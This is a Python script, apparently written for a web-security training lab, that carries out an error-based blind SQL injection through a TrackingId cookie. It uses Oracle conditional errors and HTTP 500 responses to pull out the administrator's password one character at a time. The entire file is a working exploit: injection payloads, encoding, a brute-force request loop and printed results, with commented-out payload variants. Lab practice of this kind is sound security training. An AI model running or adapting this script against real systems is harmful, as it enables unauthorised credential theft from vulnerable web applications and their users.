import requests  # This is used for making requests
import sys       # This Library is used for extracting the arguments which are being passed via cli
import urllib3
import urllib.parse # This library is used for URL-encoding our made injection payload

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url, TID, SID):
    print('URL:', url)
    print('TID .....',TID)
    print('SID .....',SID)
    password = ""
    
    # Only check a-z and 0-9
    allowed_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    list_of_characters = list(allowed_chars) # converting the String into list of characters
    password = '' # Empty password variable in which complete password will be saved
    
    print('password is : ', password)
    #  As password has 20 characters, so on each char we are going to run a for loop
    print('starting the attack ........ ')
    for charNo in range(1,21,1): 
        
            for character in list_of_characters:
                ascii_val = ord(character) # converting the character into ASCII value to embed in URL
            
                # injection_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')=%s--"%(charNo,ascii_val)
            
                # injection_payload = "' and (select case when ((select SUBSTR(password,%s,1) from users where username='administrator')=%s) then TO_NUMBER('abc') else 1 end from dual)=1--"%(charNo,ascii_val)
            
                # print('Start making the injection payload .... ')
                injection_payload = "' and (select case when ((select SUBSTR(password,%s,1) from users where username='administrator')='%s') then TO_NUMBER('abc') else 1 end from dual)=1--"%(charNo,character)
            
            
            
            
                encoded_payload = urllib.parse.quote(injection_payload)
             
                # As each request will need a cookie tuple which will contain Tracking ID & Session ID which will be given by user
            
                cookies = {
                    'TrackingId': TID + encoded_payload,
                    'session': SID
                }
            
        
                response = requests.get(url, cookies=cookies, verify=False)
            
                # print(f'Injection is : {injection_payload}')
                # print(f'{character} for place {charNo} is having status Code : {response.status_code}')
                # if response.status_code == 200:
                #     print(f'{character} is not for place {charNo}')
                            
                if response.status_code == 500:
                    print('Status Code is :', response.status_code)
                    password += character
                    print("password String : ", password)
                    break
                
            
    print("Final Password is : ", password)
    
def main():
    url = sys.argv[1]
    TID = sys.argv[2]
    SID = sys.argv[3]
    sqli_password(url,TID,SID)

if __name__ == "__main__":
    main()
